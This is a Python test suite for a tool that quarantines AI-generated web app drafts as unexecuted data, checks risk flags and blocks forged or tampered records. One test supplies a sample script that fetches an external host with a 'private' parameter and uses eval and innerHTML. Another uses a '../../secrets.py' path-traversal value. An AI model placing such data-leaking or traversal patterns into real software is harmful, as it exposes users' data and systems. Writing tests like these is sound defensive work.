"""Untrusted web draft generation tests: model doubles, NO JS execution."""
import copy
import json
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest

from toad_core.models import ModelError
from toad_core.schema import PackageError
from toad_core.web_codegen import QuarantinedWebGenerator, validate_web_source, scan_strings_only


def source():
    return {
        "schema": "toad-web-source-draft-v1",
        "name": "custom-flashcards",
        "title": "Custom Flashcards",
        "files": [
            {"path": "index.html", "content": "<!doctype html><html><head><link rel='stylesheet' href='styles.css'></head><body><button id='flip'>Flip</button><script src='app.js' defer></script></body></html>"},
            {"path": "styles.css", "content": "body { background: #111; color: #fff; }"},
            {"path": "app.js", "content": "document.querySelector('#flip').addEventListener('click', () => { document.querySelector('#flip').textContent = 'Back'; });"},
        ],
        "declared_features": ["flashcard flip", "offline use"],
    }


class ModelDouble:
    def __init__(self, proposal):
        self.proposal = proposal
        self.calls = []
    def generate_json(self, prompt, **kwargs):
        self.calls.append((json.loads(prompt), kwargs))
        if isinstance(self.proposal, Exception):
            raise self.proposal
        return copy.deepcopy(self.proposal)


class WebCodeDraftTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.workspace = self.root / "private"

    def tearDown(self):
        self.tmp.cleanup()

    def model_generator(self, payload=None):
        m = ModelDouble(source() if payload is None else payload)
        return QuarantinedWebGenerator(self.workspace, model=m), m

    def test_model_writes_source_as_data_only_and_no_web_files_are_extracted(self):
        engine, model = self.model_generator()
        report = engine.propose("Make me a flashcard game for studying")
        self.assertEqual(report["status"], "quarantined_unverified")
        self.assertTrue(report["model_authored_code"])
        self.assertFalse(report["release_allowed"])
        self.assertFalse(report["executed"])
        self.assertFalse(report["tested"])
        self.assertFalse(report["deployed"])
        self.assertTrue(report["owner_review_required"])
        self.assertEqual(len(report["file_sha256"]), 3)
        self.assertEqual(len(model.calls), 1)
        self.assertEqual(model.calls[0][0]["request"], "Make me a flashcard game for studying")
        self.assertIn("quarantine, not execution", model.calls[0][1]["purpose"])
        quarantine = self.workspace / "ai-web-drafts"
        self.assertEqual(sorted(p.suffix for p in quarantine.iterdir()), [".json"])
        self.assertFalse(any(p.suffix in (".html",".css",".js",".zip") for p in self.workspace.rglob("*") if p.is_file()))
        contents = engine.show(report["id"])
        self.assertEqual(contents["draft"]["files"][2]["path"], "app.js")
        self.assertIn("addEventListener", contents["draft"]["files"][2]["content"])
        self.assertFalse(contents["release_allowed"])
        self.assertTrue(contents["requires_independent_javascript_worker"])

    def test_risky_script_is_flagged_but_never_executed_or_installed(self):
        payload = source()
        payload["files"][2]["content"] = (
            "fetch('https://external.example/api?private=x');"
            "eval('alert(1)');document.body.innerHTML = '<p>bad</p>';"
        )
        engine, _ = self.model_generator(payload)
        draft = engine.propose("Build a static flashcard web app")
        self.assertEqual(draft["status"], "quarantined_unverified")
        self.assertIn("network_or_remote_resource", draft["risk_flags"])
        self.assertIn("dynamic_code_execution", draft["risk_flags"])
        self.assertIn("html_injection_or_dynamic_markup", draft["risk_flags"])
        self.assertFalse(draft["executed"])
        self.assertFalse(draft["release_allowed"])
        self.assertFalse((self.workspace / "app-previews").exists())

    def test_bad_paths_and_other_fields_fail_closed(self):
        cases = []
        for bad in ("../../secrets.py","api.js","package.json","index.htm"):
            p = source()
            p["files"][0]["path"] = bad
            cases.append(p)
        for edit in (
            lambda p: p.update({"permissions":["network"]}),
            lambda p: p["files"].append({"path":"worker.js","content":"self.onmessage=()=>{}"}),
            lambda p: p["files"][1].update({"mode":"runnable"}),
            lambda p: p["files"][0].update({"content":"\ud800"}),
            lambda p: p.update({"name":"bad/name"}),
            lambda p: p.update({"declared_features":["x"]*9}),
            lambda p: p["files"][2].update({"content":"a" * 64001}),
        ):
            p = source()
            edit(p)
            cases.append(p)
        for payload in cases:
            with self.subTest(payload=str(payload)[:100]):
                engine, _ = self.model_generator(payload)
                with self.assertRaises(PackageError):
                    engine.propose("Build a small offline app")
        quarantined = list((self.workspace / "ai-web-drafts").glob("*.json"))
        self.assertEqual(quarantined, [])

    def test_stored_digest_rejects_modified_draft_and_source(self):
        engine, _ = self.model_generator()
        report = engine.propose("Build flashcards")
        saved = next((self.workspace / "ai-web-drafts").glob("*.json"))
        data = json.loads(saved.read_text())
        data["draft"]["files"][2]["content"] = "console.log('tampered')"
        saved.write_text(json.dumps(data))
        with self.assertRaisesRegex(PackageError, "digest mismatch"):
            engine.review(report["id"])
        with self.assertRaises(PackageError):
            engine.show(report["id"])

    def test_invalid_goal_and_model_unavailability_create_no_drafts(self):
        engine, model = self.model_generator(ModelError("No local Ollama model"))
        for request in ("", "a"*2501, "x\x00y"):
            with self.subTest(request=repr(request[:20])), self.assertRaises(PackageError):
                engine.propose(request)
        with self.assertRaises(ModelError):
            engine.propose("Make a tiny offline game")
        self.assertEqual(len(model.calls), 1)
        self.assertEqual(list((self.workspace / "ai-web-drafts").glob("*.json")), [])

    def test_quarantine_file_count_limit_and_symlink_guard(self):
        engine, _ = self.model_generator()
        first = engine.propose("A small game")
        folder = self.workspace / "ai-web-drafts"
        for i in range(99):
            (folder / ("dummy-%03d.json" % i)).write_text("{}")
        with self.assertRaisesRegex(PackageError, "capacity"):
            engine.propose("Second game")
        self.assertEqual(len(list(folder.glob("*.json"))), 100)
        self.assertTrue(engine.show(first["id"])["requires_independent_javascript_worker"])
        other = self.root / "other"
        other.mkdir()
        link = self.root / "linked"
        try:
            link.symlink_to(other, target_is_directory=True)
        except (OSError, NotImplementedError):
            return
        with self.assertRaises(PackageError):
            QuarantinedWebGenerator(link).propose("Never follow symlinks")

    def test_security_flags_and_release_authority_cannot_be_forged(self):
        cases = [
            ("risk_flags", []),
            ("release_allowed", True),
            ("deployed", True),
            ("tested", True),
            ("executed", True),
            ("status", "verified"),
            ("owner_review_required", False),
        ]
        for field, value in cases:
            with self.subTest(field=field):
                engine, _ = self.model_generator()
                item = engine.propose("Build a small flashcard app")
                path = self.workspace / "ai-web-drafts" / (item["id"] + ".json")
                record = json.loads(path.read_text())
                if field == "risk_flags":
                    record["risk_flags"] = ["fabricated_safe"]
                else:
                    record[field] = value
                path.write_text(json.dumps(record))
                with self.assertRaises(PackageError):
                    engine.review(item["id"])
                with self.assertRaises(PackageError):
                    engine.show(item["id"])

    def test_cli_code_report_bad_id_has_nonzero_exit(self):
        r = subprocess.run([
            sys.executable, "-m", "toad_core", "--workspace",
            str(self.workspace), "app", "code-report", "not-an-id"
        ], capture_output=True, text=True, timeout=10)
        self.assertNotEqual(r.returncode, 0)
        self.assertFalse(json.loads(r.stderr)["ok"])


if __name__ == "__main__":
    unittest.main()
